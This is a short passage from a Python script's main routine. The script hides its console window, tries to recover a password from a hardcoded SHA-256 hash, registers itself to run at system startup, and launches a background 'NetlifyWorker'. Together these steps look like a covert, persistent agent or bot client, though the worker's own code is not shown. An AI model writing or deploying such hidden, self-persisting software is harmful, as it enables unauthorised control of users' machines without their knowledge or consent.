
        hide_console()
    
    # Try to auto-detect password from hash
    TARGET_HASH = "4c844d1623a7e839b349af70b3ea5f55c117a3dc83fde0326fa8b9f17eec484d"
    detected_password = find_password_from_hash(TARGET_HASH)
    
    if detected_password:
        print(f"🔑 Detected password: {detected_password}")
    else:
        print("❓ Could not auto-detect password")
        print("💡 Please set the password manually in the code")
    
    # Add to startup (only if not already there)
    add_to_startup()
    
    # Create and start worker
    worker = NetlifyWorker()
    
    # Set the password if detected
    if detected_password:
        worker.password = detected_password
        print(f"🔑 Using password: {detected_password}")
    else:
        print("⚠️  Using default password - may not work!")
    
    worker.start()
